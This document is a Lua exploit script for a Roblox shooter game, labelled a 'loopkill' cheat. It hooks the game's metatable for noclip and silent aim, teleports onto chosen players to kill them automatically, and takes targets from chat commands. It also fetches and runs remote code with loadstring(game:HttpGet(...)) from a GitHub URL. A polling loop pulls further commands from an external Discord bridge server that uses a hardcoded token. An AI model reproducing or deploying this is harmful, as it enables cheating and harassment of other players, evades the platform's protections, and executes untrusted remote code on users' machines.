-- the working loopkill v3
local bots = { ["8915812"] = true }
local OWNER_NAME = "firstaimm8"

getgenv().LoopKillActive = false
getgenv().Flinging = false
getgenv().KillMethod = "Standard"
getgenv().KillBots = false
getgenv().FarmBotStomps = getgenv().FarmBotStomps or {}
getgenv().CurrentFarmAttacker = nil
getgenv().FarmBotRounds = 0

local PersistentTargets = {}
local PersistentTargetNames = {}
local WhitelistedUsers = {}
local LastTargetPositions = {}
local VelocityBuffer = {}
local LastVelocities = {}

for name, _ in pairs(bots) do WhitelistedUsers[name:lower()] = true end
WhitelistedUsers[OWNER_NAME:lower()] = true

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local Workspace = game:GetService("Workspace")
local TextChatService = game:GetService("TextChatService")

local SAFEZONE = Vector3.new(-36.27, -15, -15.93)

-- ===== CONFIG =====
local UNDER_OFFSET    = 12
local STOMP_THRESHOLD = 35
local STOMP_SNAP_HP   = 15
local STOMP_LERP      = 0.9
local UNDER_LERP      = 0.4
local STOMP_LEAD      = 0.08

-- ===== GRIP CONFIG =====
local GRIP_CF = CFrame.new(0, 0, -15) * CFrame.Angles(math.rad(90), 0, 0)

-- ===== NOCLIP =====
local function isLocalPart(part)
    if not part or not part.Parent then return false end
    local char = LocalPlayer.Character
    if not char then return false end
    return part:IsDescendantOf(char)
end

local function unweldCharacter(char)
    if not char then return end
    for _, d in ipairs(char:GetDescendants()) do
        if d:IsA("BasePart") then
            d.CanCollide = false
            d.CanTouch = false
        end
    end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum then pcall(function() hum.HipHeight = 0 end) end
end

local function hardNoClip(char)
    if not char then return end
    for _, d in ipairs(char:GetChildren()) do
        if d:IsA("BasePart") then
            pcall(function()
                d.CanCollide = false
                d.CanTouch = false
            end)
        end
    end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum then pcall(function() hum.HipHeight = 0 end) end
end

local function hijackRightGrip(char)
    if not char then return end
    local rightHand = char:FindFirstChild("RightHand") or char:FindFirstChild("Right Arm")
    if not rightHand then return end
    local function setup(grip)
        if grip.Name == "RightGrip" and grip:IsA("Motor6D") then grip.C0 = GRIP_CF end
    end
    for _, v in pairs(rightHand:GetChildren()) do setup(v) end
    rightHand.ChildAdded:Connect(setup)
end

LocalPlayer.CharacterAdded:Connect(function(c)
    task.wait(0.05)
    unweldCharacter(c)
    hijackRightGrip(c)
    c.DescendantAdded:Connect(function(d)
        if d:IsA("BasePart") then d.CanCollide = false; d.CanTouch = false end
    end)
end)
if LocalPlayer.Character then
    task.wait()
    unweldCharacter(LocalPlayer.Character)
    hijackRightGrip(LocalPlayer.Character)
end

-- ===== HELPERS =====
local function SmoothCFrame(CurrentCF, TargetCF, Speed)
    if not TargetCF or not CurrentCF then return CurrentCF or TargetCF end
    if Speed >= 1 then return TargetCF end
    return CurrentCF:Lerp(TargetCF, Speed or 0.15)
end

local function PurgeSlot3()
    local backpack = LocalPlayer.Backpack
    if not backpack then return end
    local children = backpack:GetChildren()
    if #children >= 3 then children[3]:Destroy() end
end
task.spawn(function() while task.wait(1) do PurgeSlot3() end end)

local function GetResolvedVelocity(Target, CurrentVelocity)
    if not VelocityBuffer[Target.Name] then VelocityBuffer[Target.Name] = CurrentVelocity end
    local PrevVelocity = VelocityBuffer[Target.Name]
    local VelocityDelta = (CurrentVelocity - PrevVelocity).Magnitude
    if VelocityDelta > 80 or CurrentVelocity.Magnitude > 200 then
        VelocityBuffer[Target.Name] = Vector3.zero
        return Vector3.zero
    end
    VelocityBuffer[Target.Name] = CurrentVelocity
    return CurrentVelocity
end

local function UpdatePersistentList()
    local ActiveList = {}
    for name, _ in pairs(PersistentTargetNames) do
        local p = Players:FindFirstChild(name)
        if p and p.Character and p.Character:FindFirstChild("Humanoid") and p.Character.Humanoid.Health > 0 then
            local isBot = bots[p.Name:lower()]
            if isBot then
                if getgenv().KillBots or getgenv().KillMethod == "FarmBots" then table.insert(ActiveList, p) end
            else
                table.insert(ActiveList, p)
            end
        end
    end
    PersistentTargets = ActiveList
end
task.spawn(function() while task.wait(0.35) do UpdatePersistentList() end end)

local function OnPlayerAdded(player)
    if PersistentTargetNames[player.Name] then UpdatePersistentList() end
    player.CharacterAdded:Connect(function() if PersistentTargetNames[player.Name] then UpdatePersistentList() end end)
end
Players.PlayerAdded:Connect(OnPlayerAdded)
for _, p in pairs(Players:GetPlayers()) do OnPlayerAdded(p) end

-- ===== RESOLVE TARGET =====
local function ResolveTarget(Target)
    if not Target or not Target.Character then return nil, "Invalid" end
    local TRoot = Target.Character:FindFirstChild("HumanoidRootPart")
    local Head = Target.Character:FindFirstChild("Head")
    local UpperTorso = Target.Character:FindFirstChild("UpperTorso")
    local TPart = Head or UpperTorso or TRoot
    if not TRoot or not TPart then return nil, "Invalid" end

    local Velocity = TRoot.AssemblyLinearVelocity
    Velocity = GetResolvedVelocity(Target, Velocity)

    local prevVel = LastVelocities[Target.Name] or Velocity
    local accel = (Velocity - prevVel) / 0.05
    LastVelocities[Target.Name] = Velocity

    local CurrentPos = TPart.Position
    local LastPos = LastTargetPositions[Target.Name] or CurrentPos
    LastTargetPositions[Target.Name] = CurrentPos

    local dist = (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")) and (CurrentPos - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude or 20
    local jitterScale = math.clamp(0.3 + dist * 0.004, 0.3, 2.0)
    local jitter = Vector3.new(
        (math.random() - 0.5) * jitterScale,
        (math.random() - 0.5) * jitterScale * 0.5,
        (math.random() - 0.5) * jitterScale
    )

    local speed = Velocity.Magnitude
    local leadFactor = math.clamp(0.15 + speed * 0.0018, 0.15, 0.55)

    local isSpinning = false
    if Head and UpperTorso then
        local offset = (Head.Position - UpperTorso.Position).Magnitude
        if offset > 3 then isSpinning = true end
    end

    local aimPart = Head
    if isSpinning or not Head then
        aimPart = UpperTorso or TRoot
        jitter = jitter + Vector3.new(0, (math.random() - 0.5) * 2, 0)
    end

    local Prediction = Velocity * leadFactor
    if accel.Magnitude > 5 then Prediction = Prediction + accel * 0.06 end
    Prediction = Prediction + Vector3.new(0, math.clamp(Velocity.Y * 0.05, -1, 3), 0)

    local finalPos = aimPart.Position + Prediction + jitter
    return CFrame.new(finalPos), "Killable"
end

-- ===== EQUIP SLOT 1 =====
local function EquipSlot1AndPurgeOthers()
    local char = LocalPlayer.Character
    if not char then return end
    local hum = char:FindFirstChild("Humanoid")
    if not hum then return end
    local backpack = LocalPlayer.Backpack
    if not backpack then return end

    local children = backpack:GetChildren()
    if #children >= 2 then
        local slot2 = children[2]
        if slot2 and slot2:IsA("Tool") then slot2:Destroy() end
    end
    if #children >= 3 then
        local slot3 = children[3]
        if slot3 and slot3:IsA("Tool") then slot3:Destroy() end
    end

    local slot1 = backpack:FindFirstChild("1") or backpack:GetChildren()[1]
    if slot1 and slot1:IsA("Tool") and slot1.Parent ~= char then hum:EquipTool(slot1) end
end
task.spawn(function() while task.wait(0.3) do EquipSlot1AndPurgeOthers() end end)

-- ===== NOCLIP + SILENT AIM =====
local mt = getrawmetatable(game)
local oldIndex = mt.__index
local oldNewIndex = mt.__newindex
setreadonly(mt, false)

mt.__index = newcclosure(function(t, k)
    if k == "CanCollide" and isLocalPart(t) then return false end
    if t == Mouse and (k == "Hit" or k == "Target") then
        if getgenv().LoopKillActive then
            for _, T in pairs(PersistentTargets) do
                if T.Character and T.Character:FindFirstChild("Humanoid") and T.Character.Humanoid.Health > 0 then
                    local CF, status = ResolveTarget(T)
                    if status == "Killable" then
                        if k == "Hit" then return CF end
                        return T.Character:FindFirstChild("Head") or T.Character:FindFirstChild("UpperTorso") or T.Character:FindFirstChild("HumanoidRootPart")
                    end
                end
            end
        end
    end
    return oldIndex(t, k)
end)

mt.__newindex = newcclosure(function(t, k, v)
    if k == "CanCollide" and isLocalPart(t) then return oldNewIndex(t, k, false) end
    if k == "CanTouch" and isLocalPart(t) then return oldNewIndex(t, k, false) end
    return oldNewIndex(t, k, v)
end)
setreadonly(mt, true)

-- ===== MOVEMENT LOOP =====
local currentPhase = "idle"
local lastShotTime = 0
local lastEKey = 0
local noclipped = {}

RunService.RenderStepped:Connect(function(dt)
    local char = LocalPlayer.Character
    if not char then return end
    local MyRoot = char:FindFirstChild("HumanoidRootPart")
    local Hum = char:FindFirstChildOfClass("Humanoid")
    if not MyRoot or not Hum then return end

    pcall(function() MyRoot:SetNetworkOwner(LocalPlayer) end)
    pcall(function() Hum.PlatformStand = true end)
    pcall(function() Hum.AutoRotate = false end)
    pcall(function()
        MyRoot.AssemblyLinearVelocity = Vector3.zero
        MyRoot.AssemblyAngularVelocity = Vector3.zero
    end)

    MyRoot.CanCollide = false
    MyRoot.CanTouch = false
    if noclipped[char] ~= true then
        hardNoClip(char)
        noclipped[char] = true
    end
    if (tick() % 1) < dt then hardNoClip(char) end

    local tool = char:FindFirstChildOfClass("Tool")
    if tool then
        pcall(function() tool.Grip = CFrame.new() end)
        local rightHand = char:FindFirstChild("RightHand") or char:FindFirstChild("Right Arm")
        if rightHand then
            local rightGrip = rightHand:FindFirstChild("RightGrip")
            if rightGrip and rightGrip:IsA("Motor6D") then rightGrip.C0 = GRIP_CF end
        end
    end

    if not getgenv().LoopKillActive or getgenv().Flinging then
        currentPhase = "idle"
        MyRoot.CFrame = CFrame.new(SAFEZONE)
        return
    end

    if #PersistentTargets == 0 then
        currentPhase = "idle"
        MyRoot.CFrame = CFrame.new(SAFEZONE)
        return
    end

    local ActiveTarget = nil
    local lowestHealth = math.huge
    local closestDist = math.huge
    for _, p in pairs(PersistentTargets) do
        if p.Character and p.Character:FindFirstChild("Humanoid") and p.Character.Humanoid.Health > 0 then
            local health = p.Character.Humanoid.Health
            local dist = (MyRoot.Position - p.Character.HumanoidRootPart.Position).Magnitude
            if health < lowestHealth or (health == lowestHealth and dist < closestDist) then
                lowestHealth = health
                closestDist = dist
                ActiveTarget = p
            end
        end
    end

    if not ActiveTarget then
        currentPhase = "idle"
        MyRoot.CFrame = CFrame.new(SAFEZONE)
        return
    end

    local ResolvedCF, Status = ResolveTarget(ActiveTarget)
    if Status ~= "Killable" then
        currentPhase = "idle"
        MyRoot.CFrame = CFrame.new(SAFEZONE)
        return
    end

    local THealth = ActiveTarget.Character.Humanoid.Health
    local targetRoot = ActiveTarget.Character:FindFirstChild("HumanoidRootPart")
    local anchorPart = ActiveTarget.Character:FindFirstChild("UpperTorso") or ActiveTarget.Character:FindFirstChild("Head") or targetRoot
    if not anchorPart then
        currentPhase = "idle"
        MyRoot.CFrame = CFrame.new(SAFEZONE)
        return
    end

    local targetPos = targetRoot and targetRoot.Position or anchorPart.Position
    local targetVel = targetRoot and targetRoot.AssemblyLinearVelocity or Vector3.zero
    if targetVel.Magnitude > 200 then targetVel = Vector3.zero end
    local leadVec = Vector3.new(targetVel.X * STOMP_LEAD, 0, targetVel.Z * STOMP_LEAD)

    if THealth <= 0.5 then
        if currentPhase ~= "retreat" then
            currentPhase = "retreat"
            if getgenv().KillMethod == "FarmBots" then
                getgenv().FarmBotStomps[LocalPlayer.Name] = (getgenv().FarmBotStomps[LocalPlayer.Name] or 0) + 1
            end
            UpdatePersistentList()
        end
        MyRoot.CFrame = CFrame.new(SAFEZONE)
        return
    end

    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Exclude
    params.FilterDescendantsInstances = {char, ActiveTarget.Character}
    local ray = Workspace:Raycast(MyRoot.Position, targetPos - MyRoot.Position, params)
    local isRoofed = ray ~= nil

    if isRoofed or THealth <= STOMP_SNAP_HP then
        local stompX = targetPos.X + leadVec.X
        local stompZ = targetPos.Z + leadVec.Z
        MyRoot.CFrame = CFrame.new(stompX, targetPos.Y + 3, stompZ)
        currentPhase = "stomp"
        
        if tick() - lastEKey > 0.1 then
            lastEKey = tick()
            pcall(function()
                VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
                task.wait(0.05)
                VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
            end)
        end
    elseif THealth <= STOMP_THRESHOLD then
        local stompX = targetPos.X + leadVec.X
        local stompZ = targetPos.Z + leadVec.Z
        local underPos = Vector3.new(stompX, targetPos.Y + 3, stompZ)
        MyRoot.CFrame = SmoothCFrame(MyRoot.CFrame, CFrame.new(underPos), STOMP_LERP)
        currentPhase = "stomp"
    else
        local underPos = Vector3.new(targetPos.X, targetPos.Y - UNDER_OFFSET, targetPos.Z)
        local underCF = CFrame.new(underPos) * CFrame.Angles(math.rad(90), 0, 0)
        MyRoot.CFrame = SmoothCFrame(MyRoot.CFrame, underCF, UNDER_LERP)
        currentPhase = "under"
    end

    if tool and THealth > 0 then
        local interval
        if THealth <= STOMP_SNAP_HP then interval = 0
        elseif THealth <= STOMP_THRESHOLD then interval = 0.002
        else interval = 0.02 end
        local now = tick()
        if now - lastShotTime >= interval then
            VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 1)
            VirtualInputManager:SendMouseButtonEvent(0, 0, 0, false, game, 1)
            lastShotTime = now
        end
    end
end)

-- ===== COMMANDS =====
function ProcessCommand(msg, speaker)
    local senderName = speaker.Name:lower()
    if not WhitelistedUsers[senderName] then return end
    local args = msg:split(" ")
    local cmd = args[1]:lower()

    if cmd == ".whitelist" then
        local search = args[2] and args[2]:lower()
        for _, p in pairs(Players:GetPlayers()) do
            if p.Name:lower():find(search) or p.DisplayName:lower():find(search) then
                WhitelistedUsers[p.Name:lower()] = true
                local chatService = game:GetService("TextChatService")
                if chatService.ChatVersion == Enum.ChatVersion.TextChatService then
                    chatService.TextChannels.RBXGeneral:SendAsync("[WHITELIST] Allied with " .. p.Name)
                else
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("[WHITELIST] Allied with " .. p.Name, "All")
                end
            end
        end
    elseif cmd == ".unwhitelist" then
        local search = args[2] and args[2]:lower()
        for _, p in pairs(Players:GetPlayers()) do
            if p.Name:lower():find(search) or p.DisplayName:lower():find(search) then
                if p.Name:lower() ~= OWNER_NAME:lower() then
                    WhitelistedUsers[p.Name:lower()] = nil
                    local chatService = game:GetService("TextChatService")
                    if chatService.ChatVersion == Enum.ChatVersion.TextChatService then
                        chatService.TextChannels.RBXGeneral:SendAsync("[WHITELIST] Removed " .. p.Name .. " from allies.")
                    else
                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("[WHITELIST] Removed " .. p.Name .. " from allies.", "All")
                    end
                end
            end
        end

    elseif cmd == ".s" then
        PersistentTargetNames = {}
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= LocalPlayer and not WhitelistedUsers[p.Name:lower()] then
                PersistentTargetNames[p.Name] = true
            end
        end
        UpdatePersistentList()
        getgenv().LoopKillActive = #PersistentTargets > 0

    elseif cmd == ".loop" then
        getgenv().KillMethod = "Standard"
        PersistentTargetNames = {}
        currentPhase = "idle"
        for i = 2, #args do
            local search = args[i]:lower()
            for _, p in pairs(Players:GetPlayers()) do
                local isBot = bots[p.Name:lower()]
                -- Removed the self/owner checks so it targets anyone
                if (getgenv().KillBots or not isBot) then
                    if p.DisplayName:lower():find(search) or p.Name:lower():find(search) then
                        PersistentTargetNames[p.Name] = true
                    end
                end
            end
        end
        UpdatePersistentList()
        getgenv().LoopKillActive = #PersistentTargets > 0
        print("[LOOPKILL] Targets acquired: " .. #PersistentTargets)

    elseif cmd == ".stop" then
        getgenv().LoopKillActive = false
        getgenv().Flinging = false
        getgenv().KillMethod = "Standard"
        PersistentTargets = {}
        PersistentTargetNames = {}
        currentPhase = "idle"
        local MyRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if MyRoot then MyRoot.CFrame = CFrame.new(SAFEZONE) end
        local Tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
        if Tool then Tool.Grip = CFrame.new(0,0,0) end
    end
end

for _, p in pairs(Players:GetPlayers()) do
    p.Chatted:Connect(function(m) ProcessCommand(m, p) end)
end
Players.PlayerAdded:Connect(function(p)
    p.Chatted:Connect(function(m) ProcessCommand(m, p) end)
end)

task.spawn(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Actyrn/Scripts/main/AzureModded"))() end) end)

task.delay(6, function()
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        LocalPlayer.Character.Humanoid.Health = 0
    end
end)

local CommFolder = game:GetService("ReplicatedStorage"):FindFirstChild("CommFolder") or Instance.new("Folder", game:GetService("ReplicatedStorage"))
CommFolder.Name = "CommFolder"
local TargetValue = CommFolder:FindFirstChild("TargetName") or Instance.new("StringValue", CommFolder)
TargetValue.Name = "TargetName"

TargetValue.Changed:Connect(function(val)
    if val ~= "" then
        ProcessCommand(".loop " .. val, {Name = OWNER_NAME})
        task.wait(1)
        if LocalPlayer.Name:lower() == OWNER_NAME:lower() then TargetValue.Value = "" end
    end
end)

task.spawn(function()
    local VU = game:GetService("VirtualUser")
    LocalPlayer.Idled:Connect(function()
        VU:CaptureController()
        VU:ClickButton2(Vector2.new())
    end)
end)

task.wait(2)

task.spawn(function()
    pcall(function()
        if TextChatService and TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local channels = TextChatService.TextChannels
            if channels then
                local general = channels:FindFirstChild("RBXGeneral")
                if general then
                    general:SendAsync("Executed")
                    return
                end
            end
        end
        local rs = game:GetService("ReplicatedStorage")
        local events = rs:FindFirstChild("DefaultChatSystemChatEvents")
        if events then
            local say = events:FindFirstChild("SayMessageRequest")
            if say then
                say:FireServer("Executed", "All")
            end
        end
    end)
end)

-- =======================================================
-- ===== DISCORD RELAY (AIMSENSE) =====
-- =======================================================
local HttpService  = game:GetService("HttpService")
local PlayersSvc   = game:GetService("Players")
local BRIDGE_URL   = "https://aimsense-bridge.onrender.com"
local BRIDGE_TOKEN = "mysupersecrettoken123"
local ROBLOX_NAME  = PlayersSvc.LocalPlayer.Name:lower()
local POLL_SECS    = 0.75
local PRESENCE_SECS = 5.0

local function makeRequest(url, method, body)
    local headers = {
        ["X-Token"] = BRIDGE_TOKEN,
        ["Content-Type"] = "application/json"
    }
    local reqData = { Url = url, Method = method, Headers = headers }
    if body then reqData.Body = HttpService:JSONEncode(body) end

    if syn and syn.request then
        return syn.request(reqData)
    elseif request then
        return request(reqData)
    elseif http and http.request then
        return http.request(reqData)
    else
        if method == "GET" then
            return {Body = HttpService:GetAsync(url, true, headers), StatusCode = 200}
        else
            return {Body = HttpService:PostAsync(url, reqData.Body, Enum.HttpContentType.ApplicationJson, false, headers), StatusCode = 200}
        end
    end
end

task.spawn(function()
    while task.wait(PRESENCE_SECS) do
        pcall(function() makeRequest(BRIDGE_URL .. "/presence", "POST", {name = ROBLOX_NAME}) end)
    end
end)

task.spawn(function()
    while task.wait(POLL_SECS) do
        pcall(function()
            local resp = makeRequest(BRIDGE_URL .. "/poll?name=" .. ROBLOX_NAME, "GET")
            if resp and resp.Body then
                local data = HttpService:JSONDecode(resp.Body)
                if data and data.cmds and #data.cmds > 0 then
                    for _, cmd in ipairs(data.cmds) do
                        print("[RELAY] Received from Discord: " .. cmd)
                        pcall(function() ProcessCommand(cmd, {Name = OWNER_NAME}) end)
                    end
                end
            end
        end)
    end
end)